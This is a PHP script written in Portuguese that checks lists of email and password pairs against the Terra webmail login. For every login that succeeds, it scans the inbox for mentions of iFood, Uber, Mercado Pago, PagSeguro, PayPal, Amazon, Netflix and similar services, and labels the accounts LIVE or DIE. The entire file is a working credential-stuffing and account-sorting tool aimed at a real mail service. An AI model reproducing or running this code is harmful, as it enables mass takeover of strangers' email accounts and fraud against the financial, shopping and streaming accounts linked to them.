<?php

extract($_GET);
error_reporting(0);

function getStr($string,$start,$end){
$str = explode($start,$string);
$str = explode($end,$str[1]);
return $str[0];}
{
$separador = "|";
$e = explode("\r\n", $lista);
$c = count($e);
for ($i=0; $i < $c; $i++) { 
$explode = explode($separador, $e[$i]);
Testar(trim($explode[0]),trim($explode[1]));}
}

function Testar($email,$senha){
if (file_exists(getcwd()."/cookies.txt")) {
unlink(getcwd()."/cookies.txt");}


$time = time();


//___________________________________//
// 1 LOGIN //
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/mobile/index.php?r=site/wslogin&logincapa=1&timestamp=1624411445694');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: mail.terra.com.br',
'Accept: application/json, text/javascript, */*; q=0.01',
'Sec-Fetch-Dest: empty',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://mail.terra.com.br',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'X-Requested-With: XMLHttpRequest',
'referer: https://mail.terra.com.br/mobile/index.php?r=site/login'

));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_USERAGENT, $_Server['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'LoginForm%5Busername%5D='.$email.'&LoginForm%5Bpassword%5D='.$senha.'&YII_CSRF_TOKEN=9b3ecc1c0e1dd97d579e11d36221db9953ea1c1f');
$data1 = curl_exec($ch);

//___________________________________//

// 2 DADOS //
curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/mobile/index.php?r=message/wslist&page=1&MailBox%5Bmailbox_id%5D=INBOX');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

'Host: mail.terra.com.br',
'Accept: application/json, text/javascript, */*; q=0.01',
'Sec-Fetch-Dest: empty',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://mail.terra.com.br',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'X-Requested-With: XMLHttpRequest',
'referer: https://mail.terra.com.br/mobile/index.php?r=site/login'

));
curl_setopt($ch, CURLOPT_POST, 0);
$data2 = curl_exec($ch);





if (strpos($data2, 'Ifood')) {
$ifood = "✅";} 
else {
$ifood = "❌";}

if (strpos($data2, 'Uber')) {
$uber = "✅";} 
else {
$uber = "❌";}

if (strpos($data2, 'Mercado Livre')) {
$ml = "✅";} 
else {
$ml = "❌";}

if (strpos($data2, 'Mercado Pago')) {
$mp = "✅";} 
else {
$mp = "❌";}

if (strpos($data2, 'Americanas')) {
$americanas = "✅";} 
else {
$americanas = "❌";}

if (strpos($data2, 'Amazon')) {
$amazon = "✅";} 
else {
$amazon = "❌";}

if (strpos($data2, 'PagSeguro')) {
$pags = "✅";} 
else {
$pags = "❌";}

if (strpos($data2, 'Paypal')) {
$pp = "✅";} 
else {
$pp = "❌";}

if (strpos($data2, 'Prime')) {
$prime = "✅";} 
else {
$prime = "❌";}

if (strpos($data2, 'Netflix')) {
$netflix = "✅";} 
else {
$netflix = "❌";}

if (strpos($data2, 'Globoplay')) {
$globoplay = "✅";} 
else {
$globoplay = "❌";}

if (strpos($data2, 'Premiere')) {
$premiere = "✅";} 
else {
$premiere = "❌";}

if (strpos($data2, 'Crunchyroll')) {
$crunch = "✅";} 
else {
$crunch = "❌";}






//___________________________________//


if (strpos($data1, '"\/ozone\/","valid":true')){
exit('<b><span class="badge badge-success">LIVE</span> ➜ '.$email.'|'.$senha.'<br><font style=color:#ff33cc>PALAVRAS ENCONTRADAS</font><br><br><font style=color:lime>↓ COMIDAS ↓<br>IFOOD : '.$ifood.'<br>UBER : '.$uber.'<br><br>↓ BANK ETC ↓<br>MP : '.$mp.'<br>PAGS : '.$pags.'<br>PP : '.$pp.'<br><br>↓ LOJAS ↓<br>ML : '.$ml.'<br>AMERICANAS : '.$americanas.'<br>AMAZON : '.$amazon.'<br><br>↓ CONTAS ↓<br>NETFLIX : '.$netflix.'<br>PRIME : '.$prime.'<br>GLOBOPLAY : '.$globoplay.'<br>PREMIERE : '.$premiere.'<br>CRUNCHYROLL : '.$crunchyroll.'</font> <br><br>TEMPO DE RESPOSTA : ' . (time() - $time) .  ' Seg</b><br>');}




//___________________________________//





else if (strpos($data1, '"\/mobile\/index.php","valid":true')){
exit('<b><span class="badge badge-success">LIVE</span> ➜ '.$email.'|'.$senha.'<br><font style=color:#ff33cc>PALAVRAS ENCONTRADAS</font><br><br><font style=color:lime>↓ COMIDAS ↓<br>IFOOD : '.$ifood.'<br>UBER : '.$uber.'<br><br>↓ BANK ETC ↓<br>MP : '.$mp.'<br>PAGS : '.$pags.'<br>PP : '.$pp.'<br><br>↓ LOJAS ↓<br>ML : '.$ml.'<br>AMERICANAS : '.$americanas.'<br>AMAZON : '.$amazon.'<br><br>↓ CONTAS ↓<br>NETFLIX : '.$netflix.'<br>PRIME : '.$prime.'<br>GLOBOPLAY : '.$globoplay.'<br>PREMIERE : '.$premiere.'<br>CRUNCHYROLL : '.$crunchyroll.'</font> <br><br>TEMPO DE RESPOSTA : ' . (time() - $time) .  ' Seg</b><br>');}


else if (strpos($data1, 'https:\/\/central.terra.com.br\/index_aviso_sua')){
exit('<b><span class="badge badge-danger">DIE</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-info">Possível Violação De Regras</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

else if (strpos($data1, '"Conta sem acesso ao servi\u00e7o de e-mail"')){
exit('<b><span class="badge badge-danger">DIE</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-warning">Sem Acesso Ao Email</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

else if (strpos($data1, '"Usu\u00e1rio ou senha incorretos."')){
exit('<b><span class="badge badge-danger">DIE</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-primary">Dados Incorretos</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}

else
exit('<b><span class="badge badge-danger">DIE</span> ➜ '.$email.'|'.$senha.' ➜ <span class="badge badge-white">Desconhecido</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');}



?>